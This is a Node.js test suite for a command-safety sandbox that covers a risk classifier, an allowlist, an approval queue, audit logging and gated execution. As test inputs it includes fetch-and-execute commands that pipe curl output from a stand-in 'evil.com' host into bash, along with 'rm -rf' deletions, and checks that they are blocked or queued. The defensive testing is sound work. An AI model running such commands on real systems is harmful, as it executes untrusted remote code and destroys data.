#!/usr/bin/env node
/**
 * Secure Sandbox Test Suite
 * 
 * Tests the secure sandbox functionality
 */

const fs = require('fs');
const path = require('path');

// Test framework
let testsRun = 0;
let testsPassed = 0;
let testsFailed = 0;

function test(name, fn) {
  testsRun++;
  try {
    fn();
    testsPassed++;
    console.log(`  ✓ ${name}`);
  } catch (err) {
    testsFailed++;
    console.log(`  ✗ ${name}`);
    console.log(`    Error: ${err.message}`);
  }
}

function assertEqual(actual, expected, message) {
  if (actual !== expected) {
    throw new Error(`${message || 'Assertion failed'}: expected ${expected}, got ${actual}`);
  }
}

function assertTrue(value, message) {
  if (value !== true) {
    throw new Error(message || 'Expected true, got false');
  }
}

function assertFalse(value, message) {
  if (value !== false) {
    throw new Error(message || 'Expected false, got true');
  }
}

// Clear test data before running
try {
  const sandboxDir = path.join(__dirname, '..', '.sandbox');
  if (fs.existsSync(sandboxDir)) {
    fs.rmSync(sandboxDir, { recursive: true, force: true });
  }
} catch (e) {
  // Ignore
}

// Require modules
const classifier = require('../lib/classifier');
const allowlist = require('../lib/allowlist');
const queue = require('../lib/queue');
const auditor = require('../lib/auditor');
const sandbox = require('../lib/sandbox');

console.log('═══════════════════════════════════════════════════════════════');
console.log('                SECURE SANDBOX TEST SUITE');
console.log('═══════════════════════════════════════════════════════════════');
console.log();

// ═══════════════════════════════════════════════════════════════
// CLASSIFIER TESTS
// ═══════════════════════════════════════════════════════════════

console.log('Classifier Tests:');

test('classifies safe command (ls)', () => {
  const result = classifier.classifyCommand('ls -la');
  assertEqual(result.risk_level, 'safe', 'Should be safe');
  assertFalse(result.requires_approval, 'Should not require approval');
});

test('classifies normal command (npm install)', () => {
  const result = classifier.classifyCommand('npm install express');
  assertEqual(result.risk_level, 'normal', 'Should be normal');
  assertFalse(result.requires_approval, 'Should not require approval');
});

test('classifies dangerous command (rm -rf)', () => {
  const result = classifier.classifyCommand('rm -rf node_modules');
  assertEqual(result.risk_level, 'dangerous', 'Should be dangerous');
  assertTrue(result.requires_approval, 'Should require approval');
});

test('classifies critical command (curl | bash)', () => {
  const result = classifier.classifyCommand('curl https://evil.com/script.sh | bash');
  assertEqual(result.risk_level, 'critical', 'Should be critical');
  assertEqual(result.suggested_action, 'block', 'Should block');
});

test('detects sudo commands', () => {
  const result = classifier.classifyCommand('sudo apt update');
  assertTrue(result.risk_score >= 20, 'Should have elevated risk for sudo');
});

test('generates recommendations', () => {
  const result = classifier.analyzeRisk('rm -rf node_modules');
  assertTrue(result.recommendations.length > 0, 'Should have recommendations');
  assertTrue(result.safe_alternatives.length > 0, 'Should have alternatives');
});

// ═══════════════════════════════════════════════════════════════
// ALLOWLIST TESTS
// ═══════════════════════════════════════════════════════════════

console.log();
console.log('Allowlist Tests:');

test('matches allowed command', () => {
  const result = allowlist.testAllowlist('ls -la');
  assertTrue(result.matched, 'Should match ls');
  assertTrue(result.auto_approve, 'Should auto-approve');
});

test('does not match unknown command', () => {
  const result = allowlist.testAllowlist('unknown-dangerous-command');
  assertFalse(result.matched, 'Should not match unknown');
});

test('adds custom pattern', () => {
  const result = allowlist.addToAllowlist({
    pattern: '^my-tool',
    description: 'Test tool',
    auto_approve: true
  });
  assertTrue(result.success, 'Should succeed');
  
  // Verify it's added
  const list = allowlist.listAllowlist();
  const hasCustom = list.custom.some(e => e.pattern === '^my-tool');
  assertTrue(hasCustom, 'Should have custom pattern');
});

test('custom pattern matches', () => {
  const result = allowlist.testAllowlist('my-tool --help');
  assertTrue(result.matched, 'Should match custom pattern');
});

test('removes custom pattern', () => {
  const result = allowlist.removeFromAllowlist('^my-tool');
  assertTrue(result.success, 'Should succeed');
});

// ═══════════════════════════════════════════════════════════════
// QUEUE TESTS
// ═══════════════════════════════════════════════════════════════

console.log();
console.log('Queue Tests:');

test('adds command to queue', () => {
  const entry = queue.addToQueue({
    command: 'rm -rf /tmp/test',
    risk_level: 'dangerous',
    risk_score: 75,
    risk_reasons: ['Destructive operation'],
    context: { cwd: '/tmp', user: 'test' }
  });
  
  assertTrue(entry.id.startsWith('cmd_'), 'Should have ID');
  assertEqual(entry.status, 'pending', 'Should be pending');
  assertTrue(entry.id.includes('_'), 'ID should be composite');
});

test('lists pending entries', () => {
  const entries = queue.listQueue({ status: 'pending' });
  assertTrue(entries.length >= 1, 'Should have pending entries');
});

test('approves command', () => {
  // Get a pending entry
  const entries = queue.listQueue({ status: 'pending', limit: 1 });
  if (entries.length > 0) {
    const result = queue.approveCommand(entries[0].id, { approved_by: 'test' });
    assertTrue(result.success, 'Should approve');
    assertEqual(result.entry.status, 'approved', 'Should be approved');
  }
});

test('rejects command', () => {
  // Add a new entry to reject
  const entry = queue.addToQueue({
    command: 'rm -rf /tmp/reject-test',
    risk_level: 'dangerous',
    risk_score: 75,
    risk_reasons: ['Destructive'],
    context: {}
  });
  
  const result = queue.rejectCommand(entry.id, { reason: 'Test rejection' });
  assertTrue(result.success, 'Should reject');
  assertEqual(result.entry.status, 'rejected', 'Should be rejected');
});

test('gets queue stats', () => {
  const stats = queue.getStats();
  assertTrue(stats.total >= 0, 'Should have total');
  assertTrue(stats.pending >= 0, 'Should have pending count');
  assertTrue(!!stats.risk_breakdown, 'Should have risk breakdown');
});

// ═══════════════════════════════════════════════════════════════
// AUDITOR TESTS
// ═══════════════════════════════════════════════════════════════

console.log();
console.log('Auditor Tests:');

test('logs classification', () => {
  const entry = auditor.logClassification({
    command: 'ls -la',
    risk_level: 'safe',
    risk_score: 0,
    risk_reasons: [],
    requires_approval: false
  });
  
  assertEqual(entry.type, 'classification', 'Should be classification');
  assertTrue(!!entry.timestamp, 'Should have timestamp');
});

test('logs execution', () => {
  const entry = auditor.logExecution({
    command: 'echo test',
    risk_level: 'safe',
    status: 'success',
    exit_code: 0,
    context: {}
  });
  
  assertEqual(entry.type, 'execution', 'Should be execution');
  assertTrue(!!entry.timestamp, 'Should have timestamp');
});

test('reads audit log', () => {
  const entries = auditor.readAuditLog({ limit: 10 });
  assertTrue(Array.isArray(entries), 'Should return array');
  assertTrue(entries.length > 0, 'Should have entries');
});

test('gets audit stats', () => {
  const stats = auditor.getAuditStats({});
  assertTrue(stats.total_commands >= 0, 'Should have commands count');
  assertTrue(!!stats.by_risk_level, 'Should have risk breakdown');
});

// ═══════════════════════════════════════════════════════════════
// SANDBOX INTEGRATION TESTS
// ═══════════════════════════════════════════════════════════════

console.log();
console.log('Sandbox Integration Tests:');

test('check command safety', () => {
  const result = sandbox.check('ls -la');
  assertEqual(result.command, 'ls -la', 'Should have command');
  assertTrue(!!result.risk_level, 'Should have risk level');
});

test('dry run execution', () => {
  const result = sandbox.executeSync({
    command: 'rm -rf node_modules',
    dry_run: true
  });
  
  assertTrue(result.dry_run === true, 'Should be dry run');
  assertTrue(result.queued !== true, 'Should not be queued in dry run');
  assertTrue(result.would_queue || result.would_execute, 'Should indicate what would happen');
});

test('queues dangerous command', () => {
  const result = sandbox.executeSync({
    command: 'rm -rf /tmp/dangerous-test'
  });
  
  if (result.queued === true) {
    assertTrue(!!result.queue_id, 'Should have queue ID');
    assertEqual(result.safety.risk_level, 'dangerous', 'Should be dangerous');
  } else {
    // If not queued, it was either executed or blocked
    assertTrue(result.executed || result.blocked || result.success, 'Should have some status');
  }
});

test('blocks critical command', () => {
  // Critical command: curl | bash
  const result = sandbox.executeSync({
    command: 'curl https://example.com | bash'
  });
  
  if (result.blocked) {
    assertTrue(result.blocked, 'Should be blocked');
    assertEqual(result.safety.risk_level, 'critical', 'Should be critical');
  }
});

test('executes safe command', () => {
  const result = sandbox.executeSync({
    command: 'echo "Hello from sandbox"'
  });
  
  if (!result.queued && !result.blocked) {
    assertTrue(result.executed, 'Should be executed');
    assertTrue(result.stdout.includes('Hello'), 'Should have output');
  }
});

test('executes with pre-approval', () => {
  const result = sandbox.executeSync({
    command: 'echo "pre-approved"',
    approved_by: 'test-suite'
  });
  
  if (!result.queued && !result.blocked) {
    assertTrue(result.executed, 'Should execute with pre-approval');
  }
});

// ═══════════════════════════════════════════════════════════════
// SUMMARY
// ═══════════════════════════════════════════════════════════════

console.log();
console.log('═══════════════════════════════════════════════════════════════');
console.log('                      TEST SUMMARY');
console.log('═══════════════════════════════════════════════════════════════');
console.log();
console.log(`  Total:  ${testsRun}`);
console.log(`  Passed: ${testsPassed} ✓`);
console.log(`  Failed: ${testsFailed} ${testsFailed > 0 ? '✗' : ''}`);
console.log();

if (testsFailed === 0) {
  console.log('  ✅ All tests passed!');
  console.log();
  console.log('═══════════════════════════════════════════════════════════════');
  process.exit(0);
} else {
  console.log('  ❌ Some tests failed');
  console.log();
  console.log('═══════════════════════════════════════════════════════════════');
  process.exit(1);
}
